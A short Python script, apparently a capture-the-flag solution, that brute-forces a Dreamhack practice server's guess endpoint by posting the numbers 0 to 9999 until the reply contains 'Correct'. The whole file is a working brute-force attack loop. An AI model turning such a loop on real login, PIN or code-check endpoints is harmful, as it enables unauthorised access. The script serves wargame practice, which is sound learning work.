import requests
import time

url = 'http://host3.dreamhack.games:18518/guess'

for i in range(10000):
    res = requests.post(url, data={'guess': str(i)})
    if 'Correct' in res.text:
        print(f'[+] Found the number: {i}')
        print(res.text)
        break
    else:
        print(f'[-] {i} is incorrect')
